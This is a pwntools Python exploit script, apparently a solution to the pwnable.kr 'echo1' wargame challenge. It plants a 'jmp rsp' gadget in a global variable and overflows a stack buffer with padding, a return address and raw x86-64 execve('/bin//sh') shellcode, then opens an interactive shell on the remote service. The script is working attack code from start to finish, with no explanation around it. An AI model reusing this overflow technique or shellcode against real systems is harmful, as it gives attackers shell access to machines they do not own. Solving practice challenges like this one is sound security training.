#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo1")


context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="add-symbol-file ./echo1\nb *echo1+89")
    else:
        r = remote("pwnable.kr",  9010)

    return r


def main():
    r = conn()

    RET = 0x0000000000400607
    shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05")

    r.recvuntil(b"hey, what's your name? : ")
    r.sendline(asm("jmp rsp", arch="amd64", os='linux'))
    r.recvuntil(b"> ")
    r.sendline(b"1")

    leak = r.recvline()
    payload = b"A" * 0x28 
    payload += p64(exe.sym.id)
    payload += shellcode

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
